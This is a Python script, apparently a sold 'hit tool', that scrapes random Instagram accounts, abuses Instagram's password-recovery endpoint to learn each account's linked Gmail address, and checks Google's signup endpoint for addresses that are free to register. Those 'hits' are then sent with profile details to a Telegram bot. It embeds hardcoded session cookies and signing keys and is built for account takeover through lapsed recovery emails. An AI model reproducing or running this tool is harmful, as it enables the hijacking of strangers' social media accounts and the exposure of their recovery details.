import requests
import sys
from colorama import Fore, init

init(autoreset=True)

def api_kontrol():
    try:
        url = "https://raw.githubusercontent.com/BatuTeam3128/BatuTeam28/main/durum.txt"
        response = requests.get(url, timeout=5)
        durum = response.text.strip().upper()
        if durum != "ACIK":
            print(Fore.RED + "[×] BOLL HİTLİ INSTAGRAM TOOLUN APİSİ KAPANDI SATIN ALMAK İÇİN:) @BatuX28")
            sys.exit()
    except requests.exceptions.RequestException:
        print(Fore.RED + "[×] API HATASI.")
        sys.exit()

api_kontrol()

# Tool devamı buradan başlar
print(Fore.GREEN + "[✓] BOLL HİTLİ INSTAGRAM TOOL AKTİF TOOL BAŞLIYOR...")




s = input
X = int
W = open
V = print
L = str
K = range
F = Exception
import os, sys, re, json as Y, string as Z, random as a, hashlib as t, uuid as b, time
from datetime import datetime
from threading import Thread as u
import requests as A
from requests import post as v
from user_agent import generate_user_agent as G
from random import choice as M, randrange as N
from cfonts import render as w, say
from colorama import Fore, Style, init
from rich.console import Console as x
from rich.panel import Panel
c = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
d = "ig_sig_key_version"
e = "signed_body"
f = "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj"
C = "Content-Type"
g = "Cookie"
D = "User-Agent"
AC = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
E = "https://accounts.google.com"
h = "accounts.google.com"
i = "referer"
j = "origin"
k = "authority"
l = "application/x-www-form-urlencoded; charset=UTF-8"
O = "application/x-www-form-urlencoded;charset=UTF-8"
m = "tl.txt"
P = "@gmail.com"
H = "\x1b[1;97m"
n = "\x1b[1;94m"
AD = "\x1b[1;96m"
B = "\x1b[1;30m"
z = "\x1b[1;33m"
A0 = "\x1b[2;32m"
B = "\x1b[1;31m"
AE = "\x1b[1;95m"
A1 = "\x1b[2;35m"
A2 = "\x1b[2;39m"
H = "\x1b[38;5;231m"
AF = "\x1b[38;5;208m"
AG = "\x1b[38;5;202m"
AH = "\x1b[38;5;203m"
I = "\x1b[38;5;204m"
AI = "\x1b[38;5;209m"
AJ = "\x1b[38;5;76m"
A3 = "\x1b[38;5;120m"
A4 = "\x1b[38;5;150m"
AK = "\x1b[38;5;190m"
AL = "\x1b[1;31m"
AM = "\x1b[1;33m"
B = "\x1b[1;31m"
z = "\x1b[1;33m"
MOR = "\x1b[38;5;135m"  # Orta parlak mor
K1I = "\x1b[38;5;196m"  # Canlı ve net kırmızı
AN = "\x1b[2;31m"
SA5 = "\x1b[38;5;226m"  # Parlak sarı
A0 = "\x1b[2;32m"
A2 = "\x1b[2;34m"
A1 = "\x1b[2;35m"
AO = "\x1b[2;36m"
AP = "\x1b[1;34m"
AQ = "\x1b[1;37m"
n = "\x1b[1;37m"
T3 = "\x1b[38;5;10m"  # Daha belirgin açık yeşil
Q = 0
R = 0
S = 0
T = 0
U = 0
o = {}
A5 = w("{BATU      VIP      TOOL}", colors=["white", "blue"], align="center")
V(
    f"""
[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                      {A5}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
)
p = s("\x1b[1;33m -  𝐈𝐃 : ")
V("\x1b[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
q = s("\x1b[1;33m - 𝐓𝐨𝐤𝐞𝐧 : ")
os.system("clear")
try:
    A.post(
        f"SS atmayı unutmayın."
    )
except F:
    pass


def J():
    A = f"\r{T3}Hits{T3} : {R}{I} |{K1I} Bad IG{K1I} : {I}{S}{H} | {MOR}Bad Email{MOR} : {I}{T}{B} | {SA5}Good IG{SA5} : {I}{U}"
    sys.stdout.write(A)
    sys.stdout.flush()


def r():
    try:
        B = "azertyuiopmlkjhgfdsqwxcvbn"
        I = "".join(M(B) for A in K(N(6, 9)))
        J = "".join(M(B) for A in K(N(3, 9)))
        H = "".join(M(B) for A in K(N(15, 30)))
        Q = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            C: O,
            "google-accounts-xsrf": "1",
            D: L(G()),
        }
        R = f"{E}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
        S = A.get(R, headers=Q)
        T = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            S.text,
        ).group(2)
        U = {"__Host-GAPS": H}
        X = {
            k: h,
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            C: O,
            "google-accounts-xsrf": "1",
            j: E,
            i: "https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn",
            D: G(),
        }
        Y = {
            "f.req": f'["{T}","{I}","{J}","{I}","{J}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            "deviceinfo": '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        P = A.post(
            f"{E}/_/signup/validatepersonaldetails", cookies=U, headers=X, data=Y
        )
        Z = L(P.text).split('",null,"')[1].split('"')[0]
        H = P.cookies.get_dict()["__Host-GAPS"]
        with W(m, "w") as a:
            a.write(f"{Z}//{H}\n")
    except F as b:
        V(b)
        r()


r()


def A6(email):
    A = email
    global T, R
    try:
        if "@" in A:
            A = A.split("@")[0]
        with W(m, "r") as H:
            I = H.read().splitlines()[0]
        B, K = I.split("//")
        L = {"__Host-GAPS": K}
        M = {
            k: h,
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            C: O,
            "google-accounts-xsrf": "1",
            j: E,
            i: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={B}",
            D: G(),
        }
        N = {"TL": B}
        Q = f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{B}%22%2C%22{A}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&"
        S = v(
            f"{E}/_/signup/usernameavailability", params=N, cookies=L, headers=M, data=Q
        )
        if '"gf.uar",1' in S.text:
            R += 1
            J()
            U = A + P
            V, X = U.split("@")
            A9(V, X)
        else:
            T += 1
            J()
    except F:
        pass


def A7(email):
    B = email
    global U, S
    F = G()
    H = "android-"
    I = H + t.md5(L(b.uuid4()).encode()).hexdigest()[:16]
    E = L(b.uuid4())
    K = {D: F, g: f, C: l}
    M = {
        e: "0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f."
        + Y.dumps(
            {
                "_csrftoken": "9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
                "adid": E,
                "guid": E,
                "device_id": I,
                "query": B,
            }
        ),
        d: "4",
    }
    N = A.post(c, headers=K, data=M).text
    if B in N:
        if P in B:
            A6(B)
        U += 1
        J()
    else:
        S += 1
        J()


def A8(user):
    try:
        E = {
            "X-Pigeon-Session-Id": "50cc6861-7036-43b4-802e-fb4282799c60",
            "X-Pigeon-Rawclienttime": "1700251574.982",
            "X-IG-Connection-Speed": "-1kbps",
            "X-IG-Bandwidth-Speed-KBPS": "-1.000",
            "X-IG-Bandwidth-TotalBytes-B": "0",
            "X-IG-Bandwidth-TotalTime-MS": "0",
            "X-Bloks-Version-Id": "c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0",
            "X-IG-Connection-Type": "WIFI",
            "X-IG-Capabilities": "3brTvw==",
            "X-IG-App-ID": "567067343352427",
            D: "Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)",
            "Accept-Language": "en-GB, en-US",
            g: f,
            C: l,
            "Accept-Encoding": "gzip, deflate",
            "Host": "i.instagram.com",
            "X-FB-HTTP-Engine": "Liger",
            "Connection": "keep-alive",
            "Content-Length": "356",
        }
        F = {
            e: '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'
            + user
            + '"}',
            d: "4",
        }
        G = A.post(c, headers=E, data=F).json()
        B = G.get("email", "Reset None")
    except:
        B = "Reset None"
    return B


def AR(hy):
    try:
        A = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
        ]
        for B, C in A:
            if hy <= B:
                return C
        return 2023
    except F:
        pass


def A9(username, domain):
    C = username
    global Q
    B = o.get(C, {})
    N = B.get("pk")
    O = B.get("full_name")
    D = B.get("follower_count")
    I = B.get("following_count")
    E = B.get("media_count")
    J = B.get("biography")

    if D and E:
        G = True if X(D) >= 10 and X(E) >= 0 else False
    else:
        G = False

    Q += 1

    H = f"""
╔═════════════ ★ 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝐇𝐈𝐓 ★ ═════════════╗
║                                              
║ 🧿 𝐇𝐢𝐭 𝐒𝐚𝐲ı𝐬ı   : {Q}
║ 🧿 𝐊𝐮𝐥𝐥𝐚𝐧ı𝐜ı     : {C}
║ 🧿 𝐄-𝐏𝐨𝐬𝐭𝐚       : {C}@{domain}
║ 🧿 𝐓𝐚𝐤𝐢𝐩𝐜𝐢       : {D}
║ 🧿 𝐓𝐚𝐤𝐢𝐩         : {I}
║ 🧿 𝐆ö𝐧𝐝𝐞𝐫𝐢       : {E}
║ 🧿 𝐁𝐢𝐨            : {J}
║ 🧿 𝐑𝐞𝐬𝐞𝐭         : {A8(C)}
║ 🧿 𝐌𝐞𝐭𝐚 : {"✅ Aktif" if G else "❌ Kapalı"}
║                                              
╚═════════════ ⌯ @BatuX28 ⌯ @BatuPython028 ═════╝
"""

    print(H)
    K = x()
    L = Panel(
        H,
        title="Instagram Account Info",
        subtitle="Detailed Account Information",
        title_align="center",
        border_style="cyan",
    )
    K.print(L)
    try:
        A.get(f"https://api.telegram.org/bot{q}/sendMessage?chat_id={p}&text={H}")
    except F:
        pass


AA = 10


def AB():
    while True:
        D = {
            "lsd": "".join(a.choices(Z.ascii_letters + Z.digits, k=32)),
            "variables": Y.dumps(
                {
                    "id": X(a.randrange(2040000000, 2500000000)),
                    "render_surface": "PROFILE",
                }
            ),
            "doc_id": "25618261841150840",
        }
        E = {"X-FB-LSD": D["lsd"]}
        try:
            F = A.post("https://www.instagram.com/api/graphql", headers=E, data=D)
            B = F.json().get("data", {}).get("user", {})
            C = B.get("username")
            G = B.get("follower_count", 0)
            if C and G >= AA:
                o[C] = B
                H = [C + P]
                for I in H:
                    A7(I)
        except:
            pass


for _ in K(50):
    u(target=AB).start()
